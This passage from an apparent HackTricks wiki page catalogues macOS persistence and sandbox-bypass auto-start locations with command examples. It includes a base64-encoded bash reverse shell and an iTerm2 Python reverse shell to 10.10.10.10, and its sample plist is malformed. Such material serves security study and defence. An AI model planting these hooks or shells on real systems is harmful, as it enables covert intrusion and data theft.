# macOS Auto Start

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4) and to specify the **permissions** needed.

## Sandbox Bypass

{% hint style="success" %}
Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **waiting** for a very **common** **action**, a determined **amount of time** or an **action you can usually perform** from inside a sandbox without needing root permissions.
{% endhint %}

### Launchd

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

* **`/Library/LaunchAgents`**
  * **Trigger**: Reboot
  * Root required
* **`/Library/LaunchDaemons`**
  * **Trigger**: Reboot
  * Root required
* **`/System/Library/LaunchAgents`**
  * **Trigger**: Reboot
  * Root required
* **`/System/Library/LaunchDaemons`**
  * **Trigger**: Reboot
  * Root required
* **`~/Library/LaunchAgents`**
  * **Trigger**: Relog-in
* **`~/Library/LaunchDemons`**
  * **Trigger**: Relog-in

{% hint style="success" %}
As interesting fact, **`launchd`** has an embedded property list in a the Mach-o section `__Text.__config` which contains other well known services launchd must start. Moreover, these services can contain the `RequireSuccess`, `RequireRun` and `RebootOnSuccess` that means that they must be run and complete successfully.

Ofc, It cannot be modified because of code signing.
{% endhint %}

#### Description & Exploitation

**`launchd`** is the **first** **process** executed by OX S kernel at startup and the last one to finish at shut down. It should always have the **PID 1**. This process will **read and execute** the configurations indicated in the **ASEP** **plists** in:

* `/Library/LaunchAgents`: Per-user agents installed by the admin
* `/Library/LaunchDaemons`: System-wide daemons installed by the admin
* `/System/Library/LaunchAgents`: Per-user agents provided by Apple.
* `/System/Library/LaunchDaemons`: System-wide daemons provided by Apple.

When a user logs in the plists located in `/Users/$USER/Library/LaunchAgents` and `/Users/$USER/Library/LaunchDemons` are started with the **logged users permissions**.

The **main difference between agents and daemons is that agents are loaded when the user logs in and the daemons are loaded at system startup** (as there are services like ssh that needs to be executed before any user access the system). Also agents may use GUI while daemons need to run in the background.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

There are cases where an **agent needs to be executed before the user logins**, these are called **PreLoginAgents**. For example, this is useful to provide assistive technology at login. They can be found also in `/Library/LaunchAgents`(see [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) an example).

{% hint style="info" %}
New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however those plist files won't be automatically loaded after reboot).\
It's also possible to **unload** with `launchctl unload <target.plist>` (the process pointed by it will be terminated),

To **ensure** that there isn't **anything** (like an override) **preventing** an **Agent** or **Daemon** **from** **running** run: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

List all the agents and daemons loaded by the current user:

```bash
launchctl list
```

{% hint style="warning" %}
If a plist is owned by a user, even if it's in a daemon system wide folders, the **task will be executed as the user** and not as root. This can prevent some privilege escalation attacks.
{% endhint %}

#### More info about launchd

**`launchd`** is the **first** user mode process which is started from the **kernel**. The process start must be **successful** and it **cannot exit or crash**. It's even **protected** against some **killing signals**.

One of the first things `launchd` would do is to **start** all the **daemons** like:

* **Timer daemons** based on time to be executed:
  * atd (`com.apple.atrun.plist`): Has a `StartInterval` of 30min
  * crond (`com.apple.systemstats.daily.plist`): Has `StartCalendarInterval` to start at 00:15
* **Network daemons** like:
  * `org.cups.cups-lpd`: Listens in TCP (`SockType: stream`) with `SockServiceName: printer`
    * SockServiceName must be either a port or a service from `/etc/services`
  * `com.apple.xscertd.plist`: Listens on TCP in port 1640
* **Path daemons** that are executed when a specified path changes:
  * `com.apple.postfix.master`: Checking the path `/etc/postfix/aliases`
* **IOKit notifications daemons**:
  * `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
* **Mach port:**
  * `com.apple.xscertd-helper.plist`: It's indicating in the `MachServices` entry the name `com.apple.xscertd.helper`
* **UserEventAgent:**
  * This is different from the previous one. It makes launchd spawn apps in response to specific event. However, in this case, the main binary involved isn't `launchd` but `/usr/libexec/UserEventAgent`. It loads plugins from the SIP restricted folder /System/Library/UserEventPlugins/ where each plugin indicates its initialiser in the `XPCEventModuleInitializer` key or. in the case of older plugins, in the `CFPluginFactories` dict under the key `FB86416D-6164-2070-726F-70735C216EC0` of its `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  * But you need to find an app with a TCC bypass that executes a shell that loads these files

#### Locations

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
  * **Trigger**: Open a terminal with zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  * **Trigger**: Open a terminal with zsh
  * Root required
* **`~/.zlogout`**
  * **Trigger**: Exit a terminal with zsh
* **`/etc/zlogout`**
  * **Trigger**: Exit a terminal with zsh
  * Root required
* Potentially more in: **`man zsh`**
* **`~/.bashrc`**
  * **Trigger**: Open a terminal with bash
* `/etc/profile` (didn't work)
* `~/.profile` (didn't work)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  * **Trigger**: Expected to trigger with xterm, but it **isn't installed** and even after installed this error is thrown: xterm: `DISPLAY is not set`

#### Description & Exploitation

When initiating a shell environment such as `zsh` or `bash`, **certain startup files are run**. macOS currently uses `/bin/zsh` as the default shell. This shell is automatically accessed when the Terminal application is launched or when a device is accessed via SSH. While `bash` and `sh` are also present in macOS, they need to be explicitly invoked to be used.

The man page of zsh, which we can read with **`man zsh`** has a long description of the startup files.

```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```

### Re-opened Applications

{% hint style="danger" %}
Configuring the indicated exploitation and loging-out and loging-in or even rebooting didn't work for me to execute the app. (The app wasn't being executed, maybe it needs to be running when these actions are performed)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  * **Trigger**: Restart reopening applications

#### Description & Exploitation

All the applications to reopen are inside the plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

So, make the reopen applications launch your own one, you just need to **add your app to the list**.

The UUID can be found listing that directory or with `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

To check the applications that will be reopened you can do:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

To **add an application to this list** you can use:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Preferences

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  * Terminal use to have FDA permissions of the user use it

#### Location

* **`~/Library/Preferences/com.apple.Terminal.plist`**
  * **Trigger**: Open Terminal

#### Description & Exploitation

In **`~/Library/Preferences`** are store the preferences of the user in the Applications. Some of these preferences can hold a configuration to **execute other applications/scripts**.

For example, the Terminal can execute a command in the Startup:

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

This config is reflected in the file **`~/Library/Preferences/com.apple.Terminal.plist`** like this:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

So, if the plist of the preferences of the terminal in the system could be overwritten, the the **`open`** functionality can be used to **open the terminal and that command will be executed**.

You can add this from the cli with:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal Scripts / Other file extensions

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  * Terminal use to have FDA permissions of the user use it

#### Location

* **Anywhere**
  * **Trigger**: Open Terminal

#### Description & Exploitation

If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.

Try it with:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```

You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

{% hint style="danger" %}
If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).
{% endhint %}

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  * You might get some extra TCC access

#### Location

* **`/Library/Audio/Plug-Ins/HAL`**
  * Root required
  * **Trigger**: Restart coreaudiod or the computer
* **`/Library/Audio/Plug-ins/Components`**
  * Root required
  * **Trigger**: Restart coreaudiod or the computer
* **`~/Library/Audio/Plug-ins/Components`**
  * **Trigger**: Restart coreaudiod or the computer
* **`/System/Library/Components`**
  * Root required
  * **Trigger**: Restart coreaudiod or the computer

#### Description

According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  * You might get some extra TCC access

#### Location

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.

It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.

### ~~Login/Logout Hooks~~

{% hint style="danger" %}
This didn't work for me, neither with the user LoginHook nor with the root LogoutHook
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* You need to be able to execute something like `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  * `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

They are deprecated but can be used to execute commands when a user logs in.

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

This setting is stored in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

To delete it:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

The root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

{% hint style="success" %}
Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **expecting not super common conditions** like specific **programs installed, "uncommon" user** actions or environments.
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * However, you need to be able to execute `crontab` binary
  * Or be root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
  * Root required for direct write access. No root required if you can execute `crontab <file>`
  * **Trigger**: Depends on the cron job

#### Description & Exploitation

List the cron jobs of the **current user** with:

```bash
crontab -l
```

You can also see all the cron jobs of the users in **`/usr/lib/cron/tabs/`** and **`/var/at/tabs/`** (needs root).

In MacOS several folders executing scripts with **certain frequency** can be found in:

```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```

There you can find the regular **cron** **jobs**, the **at** **jobs** (not very used) and the **periodic** **jobs** (mainly used for cleaning temporary files). The daily periodic jobs can be executed for example with: `periodic daily`.

To add a **user cronjob programatically** it's possible to use:

```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  * iTerm2 use to have granted TCC permissions

#### Locations

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  * **Trigger**: Open iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  * **Trigger**: Open iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  * **Trigger**: Open iTerm

#### Description & Exploitation

Scripts stored in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** will be executed. For example:

```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```

or:

```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
    async with iterm2.CustomControlSequenceMonitor(
            connection, "shared-secret", r'^create-window$') as mon:
        while True:
            match = await mon.async_get()
            await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```

The script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** will also be executed:

```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2.plist`** can **indicate a command to execute** when the iTerm2 terminal is opened.

This setting can be configured in the iTerm2 settings:

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

And the command is reflected in the preferences:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

You can set the command to execute with:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Highly probable there are **other ways to abuse the iTerm2 preferences** to execute arbitrary commands.
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But xbar must be installed
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  * It requests Accessibility permissions

#### Location

* **`~/Library/Application\ Support/xbar/plugins/`**
  * **Trigger**: Once xbar is executed

#### Description

If the popular program [**xbar**](https://github.com/matryer/xbar) is installed, it's possible to write a shell script in **`~/Library/Application\ Support/xbar/plugins/`** which will be executed when xbar is started:

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But Hammerspoon must be installed
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  * It requests Accessibility permissions

#### Location

* **`~/.hammerspoon/init.lua`**
  * **Trigger**: Once hammerspoon is executed

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) serves as an automation platform for **macOS**, leveraging the **LUA scripting language** for its operations. Notably, it supports the integration of complete AppleScript code and the execution of shell scripts, enhancing its scripting capabilities significantly.

The app looks for a single file, `~/.hammerspoon/init.lua`, and when started the script will be executed.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But BetterTouchTool must be installed
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  * It requests Automation-Shortcuts and Accessibility permissions

#### Location

* `~/Library/Application Support/BetterTouchTool/*`

This tool allows to indicate applications or scripts to execute when some shortcuts are pressed . An attacker might be able configure his own **shortcut and action to execute in the database** to make it execute arbitrary code (a shortcut could be to just to press a key).

### Alfred

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But Alfred must be installed
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  * It requests Automation, Accessibility and even Full-Disk access permissions

#### Location

* `???`

It allows to create workflows that can execute code when certain conditions are met. Potentially it's possible for an attacker to create a workflow file and make Alfred load it (it's needed to pay the premium version to use workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But ssh needs to be enabled and used
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  * SSH use to have FDA access

#### Location

* **`~/.ssh/rc`**
  * **Trigger**: Login via ssh
* **`/etc/ssh/sshrc`**
  * Root required
  * **Trigger**: Login via ssh

{% hint style="danger" %}
To turn ssh on requres Full Disk Access:

```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Description & Exploitation

By default, unless `PermitUserRC no` in `/etc/ssh/sshd_config`, when a user **logins via SSH** the scripts **`/etc/ssh/sshrc`** and **`~/.ssh/rc`** will be executed.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But you need to execute `osascript` with args
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
  * **Trigger:** Login
  * Exploit payload stored calling **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
  * **Trigger:** Login
  * Root required

#### Description

In System Preferences -> Users & Groups -> **Login Items** you can find **items to be executed when the user logs in**.\
It it's possible to list them, add and remove from the command line:

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}' 

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"' 
```

These items are stored in the file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** can **also** be indicated in using the API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) which will store the configuration in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Check previous section about Login Items, this is an extension)

If you store a **ZIP** file as a **Login Item** the **`Archive Utility`** will open it and if the zip was for example stored in **`~/Library`** and contained the Folder **`LaunchAgents/file.plist`** with a backdoor, that folder will be created (it isn't by default) and the plist will be added so the next time the user logs in again, the **backdoor indicated in the plist will be executed**.

Another options would be to create the files **`.bash_profile`** and **`.zshenv`** inside the user HOME so if the folder LaunchAgents already exist this technique would still work.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But you need to **execute** **`at`** and it must be **enabled**
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* Need to **execute** **`at`** and it must be **enabled**

#### **Description**

`at` tasks are designed for **scheduling one-time tasks** to be executed at certain times. Unlike cron jobs, `at` tasks are automatically removed post-execution. It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns under certain conditions.

By **default** they are **disabled** but the **root** user can **enable** **them** with:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

This will create a file in 1 hour:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Check the job queue using `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Above we can see two jobs scheduled. We can print the details of the job using `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

{% hint style="warning" %}
If AT tasks aren't enabled the created tasks won't be executed.
{% endhint %}

The **job files** can be found at `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

The filename contains the queue, the job number, and the time it’s scheduled to run. For example let’s take a loot at `a0001a019bdcd2`.

* `a` - this is the queue
* `0001a` - job number in hex, `0x1a = 26`
* `019bdcd2` - time in hex. It represents the minutes passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT: 2021. April 27., Tuesday 7:46:00`.

If we print the job file, we find that it contains the same information we got using `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  * It has some basic TCC permissions like Desktop, Documents and Downloads

#### Location

* **`/Library/Scripts/Folder Action Scripts`**
  * Root required
  * **Trigger**: Access to the specified folder
* **`~/Library/Scripts/Folder Action Scripts`**
  * **Trigger**: Access to the specified folder

#### Description & Exploitation

Folder Actions are scripts automatically triggered by changes in a folder such as adding, removing items, or other actions like opening or resizing the folder window. These actions can be utilized for various tasks, and can be triggered in different ways like using the Finder UI or terminal commands.

To set up Folder Actions, you have options like:

1. Crafting a Folder Action workflow with [Automator](https://support.apple.com/guide/automator/welcome/mac) and installing it as a service.
2. Attaching a script manually via the Folder Actions Setup in the context menu of a folder.
3. Utilizing OSAScript to send Apple Event messages to the `System Events.app` for programmatically setting up a Folder Action.
   * This method is particularly useful for embedding the action into the system, offering a level of persistence.

The following script is an example of what can be executed by a Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

To make the above script usable by Folder Actions, compile it using:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

After the script is compiled, set up Folder Actions by executing the script below. This script will enable Folder Actions globally and specifically attach the previously compiled script to the Desktop folder.

